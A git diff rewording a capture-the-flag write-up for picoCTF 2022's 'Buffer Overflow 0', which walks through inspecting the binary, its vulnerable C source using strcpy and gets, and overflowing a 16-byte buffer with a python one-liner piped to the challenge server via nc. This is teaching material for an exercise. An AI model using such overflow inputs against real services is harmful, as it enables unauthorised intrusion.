@@ -3,7 +3,7 @@ title: picoCTF 2022 - Buffer Overflow 0
 tags: [pico22, bof, pwn]
 ---
 
-Let's gather some information before trying to run the executable
+Let's gather some information before attempting to execute the binary
 
 ```bash
 $ file vuln
@@ -17,7 +17,7 @@ $ pwn checksec vuln
     PIE:      PIE enabled
 ```
 
-We can see that it's a 32 bit ELF file dinamically linked and not stripped. If we try to run the file it asks for a text file named `flag.txt`. Let's create it and run the file again.
+We can see that it's a 32 bit ELF file dinamically linked and not stripped. If we attempt to execute it, we are prompted for a text file named `flag.txt`. Let's create it and run the file again.
 
 ```bash
 $ echo "Buffer Overflow HERE" >> flag.txt
@@ -27,7 +27,7 @@ Input: zanef
 The program will exit now
 ```
 
-Nothing strange happens. Check the source code
+Nothing strange happens. We check the source code
 
 ```c
 #include <stdio.h>
@@ -75,7 +75,7 @@ int main(int argc, char **argv){
 }
 ```
 
-There's only one function that should stands out and it's `sigsegv_handler`. This function receives an integer and prints out the flag. We can see that in this line it's passed as an argument to another function named `signal`
+There's only one function that should stands out and it's `sigsegv_handler`. This function receives an integer and prints out the flag. We can see that in this line `sigsegv_handler` is passed as an argument to another function named `signal`
 
 ```c
 signal(SIGSEGV, sigsegv_handler); // Set up signal handler
@@ -83,7 +83,7 @@ signal(SIGSEGV, sigsegv_handler); // Set up signal handler
 
 With a simple search we can read that `signal` _"sets a function to handle signal i.e. a signal handler with signal numer sig"_ and `SIGSEV` is _"a signal propagated when a program tries to read or write outside the memory it is allocated for it"_. With these two definitions we can deduce that this program, when there's an invalid storage read or write, calls the handler that prints the flag.
 
-Ok, we have to write or read outside the memory boundaries. Check the source code again and we can see that the function `vuln` uses `strcpy` to copy the input string into a buffer. `strcpy` is a buffer overflow vulnerable function so if we pass a string larger than the buffer, `strcpy` will try to write it anyway and will overwrite other memory addresses after the buffer.
+We have to write or read outside the program boundaries. Check the source code again and we can see that the function `vuln` uses `strcpy` to copy the input string into a buffer. `strcpy` is a function vulnerable to buffer overflow so if we pass an input larger than the buffer that sould contain it, `strcpy` will try to write it anyway and will overwrite the memory addresses after the limits.
 
 ```c
 void vuln(char *input){
@@ -92,14 +92,14 @@ void vuln(char *input){
 }
 ```
 
-We can see that in the `main` function it's used `gets` that is another bof vulnerable function.
+We can see that in the `main` function it's used `gets` that is another buffer overflow vulnerable function.
 
 ```c
 char buf1[100];
   gets(buf1);
 ```
 
-Let's exploit `strcpy` giving the program inputs larger than 16 bytes.
+Let's exploit `strcpy` by feeding the program with inputs longer than 16 bytes.
 
 ```bash
 $ python -c 'print "A" * 16' | ./vuln
@@ -116,7 +116,7 @@ $ sudo dmesg
 segfault at 0 ip 00007fc88e67c375 sp 00007ffec5897fd8 error 4 in libc-2.33.so[7fc88e52e000+158000] 
 ```
 
-Let's exploit the service and get some points
+We can now exploit the remote service and get some points
 
 ```bash
 $ python -c 'print "A" * 20' | nc saturn.picoctf.net 65355
